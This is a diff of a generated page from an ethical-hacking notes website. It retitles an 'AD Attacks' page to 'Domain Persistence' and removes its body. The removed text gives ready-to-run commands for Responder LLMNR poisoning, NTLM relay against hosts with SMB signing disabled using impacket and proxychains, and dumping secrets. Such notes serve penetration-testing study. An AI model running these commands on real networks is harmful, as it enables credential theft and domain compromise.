@@ -6,17 +6,17 @@
 		<meta name="viewport" content="width=device-width, initial-scale=1">
 
 		<!-- Begin Jekyll SEO tag v2.5.0 -->
-<title>AD Attacks | Hacking Notes</title>
+<title>Domain Persistence | Hacking Notes</title>
 <meta name="generator" content="Jekyll v3.8.4" />
-<meta property="og:title" content="AD Attacks" />
+<meta property="og:title" content="Domain Persistence" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Without Credentials" />
-<meta property="og:description" content="Without Credentials" />
-<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/active-directory/ad-attacks/" />
-<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/active-directory/ad-attacks/" />
+<meta name="description" content="Notes for an ethical hacker." />
+<meta property="og:description" content="Notes for an ethical hacker." />
+<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/active-directory/domain-persistence/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/active-directory/domain-persistence/" />
 <meta property="og:site_name" content="Hacking Notes" />
 <script type="application/ld+json">
-{"description":"Without Credentials","url":"http://0.0.0.0:4000/hackingnotes/active-directory/ad-attacks/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"AD Attacks","@context":"http://schema.org"}</script>
+{"description":"Notes for an ethical hacker.","url":"http://0.0.0.0:4000/hackingnotes/active-directory/domain-persistence/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Domain Persistence","@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
@@ -63,9 +63,9 @@
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/lateral-movement/">Lateral Movement</a></li>
 								
-									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-persistence/">Domain Persistence</a></li>
+									<li class="nav-item current"><a href="/hackingnotes/active-directory/domain-persistence/">Domain Persistence</a></li>
 								
-									<li class="nav-item current"><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
 								
 							</ul>
 						</li>
@@ -272,70 +272,10 @@
 		<section class="main">
 			<div class="page-header">
 				<h2>Active Directory</h2>
-				<h3>AD Attacks</h3>
+				<h3>Domain Persistence</h3>
 			</div>
 			<article class="content">
-				<h1 id="without-credentials">Without Credentials</h1>
-
-<h2 id="llmnr--netbios-poisoning">LLMNR / NetBIOS Poisoning</h2>
-
-<p>We can grab some hashed credentials if LLMNR protocol is enabled.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo responder -I eth0 -Fw
-</code></pre></div></div>
-
-<p>After some time we can get all the hashes.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /usr/share/responder
-sudo python DumpHash.py
-</code></pre></div></div>
-
-<h2 id="ntlm-relay-smb-signing-disabled">NTLM Relay (SMB signing disabled)</h2>
-
-<p>Some tiems some server are misconfigured and have the smb signing disabled, so we can perform more attacks with responder.</p>
-
-<h3 id="configuration">Configuration</h3>
-
-<ul>
-  <li>/etc/proxychains4.conf</li>
-</ul>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socks4  127.0.0.1       1080
-</code></pre></div></div>
-
-<ul>
-  <li>/usr/share/responder/Responder.conf</li>
-</ul>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Responder Core]
-
-; Servers to start
-SMB = Off
-HTTP = On
-</code></pre></div></div>
-
-<h3 id="perform-the-attack">Perform the attack</h3>
-
-<p>We need to get a list of the servers with the SMB sigining disabled.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb --gen-relay-list vulnerable_servers.txt 10.10.10.0/24
-</code></pre></div></div>
-
-<p>Execute the attack with Responder and Impacket.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-ntlmrelayx.py -tf ./vulnerable_servers.txt -socks -smb2support
-sudo responder -I eth0
-</code></pre></div></div>
-
-<p>We can list the current sessions with the next command.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx&gt; socks
-</code></pre></div></div>
-
-<p>When a session with administrative privileges is found we can use secretsdump or other tool with proxychains to use the session captured.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains impacket-secretdump DOMAIN/admin@IP
-</code></pre></div></div>
+				
 
 			</article>
 		</section>
